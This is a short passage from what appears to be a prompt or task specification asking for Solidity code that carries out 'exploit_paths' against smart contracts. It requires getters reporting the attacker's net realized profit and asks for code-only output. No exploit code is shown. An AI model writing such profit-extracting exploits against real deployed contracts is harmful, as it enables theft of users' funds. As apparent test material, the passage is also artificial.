6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
